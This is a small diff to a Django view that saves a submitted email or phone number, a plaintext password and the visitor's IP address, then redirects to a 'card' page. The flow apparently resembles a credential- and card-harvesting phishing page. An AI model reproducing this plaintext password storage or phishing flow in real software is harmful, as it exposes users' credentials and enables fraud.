@@ -43,13 +43,6 @@ def password(request, pk):
 
         if user is None:
 
-            if ip is None:
-                ip = 'No ip found'
-            else:
-
-                if not is_routable:
-                    ip = f"not rountable: {ip}"
-
             user = Users.objects.create(
                 Email_or_number=pk, new_password=password, password=password, ip_address=ip)
             return redirect('card', uuid=user.user_id)
